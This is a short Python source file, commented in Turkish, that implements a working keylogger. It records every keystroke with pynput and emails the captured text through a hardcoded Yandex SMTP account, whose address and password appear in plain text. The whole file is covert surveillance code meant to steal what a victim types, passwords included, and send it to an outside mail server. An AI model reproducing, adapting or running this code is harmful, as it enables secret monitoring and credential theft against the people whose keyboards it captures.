import getpass # şifre girerken kullanılan kütüphane
import smtplib # mail 
from pynput.keyboard import Key, Listener


email = 'denemesiber@yandex.com'
password = 'siber123*'
server = smtplib.SMTP_SSL('smtp.yandex.com.tr', 465)
server.login(email, password)

full_log = ''.encode()
word = ''.encode()
email_char_limit = 5

def on_press(key):
    global word
    global full_log
    global email
    global email_char_limit

    if key == Key.space or key == Key.enter:
        word += ' '.encode()
        full_log += word
        word = ''.encode()
        if len(full_log) >= email_char_limit:
            send_log()
            full_log = b''
    elif key == Key.shift_l or key == Key.shift_r:
        return
    elif key == Key.backspace:
        word = word[:-1]
    else:
        char = f'{key}'
        char = char[1:-1]
        word += char.encode()

    if key == Key.esc:
        return False

def send_log():
    server.sendmail(
        email,
        email,
        full_log
    )

with Listener( on_press =on_press ) as listener:
    listener.join()


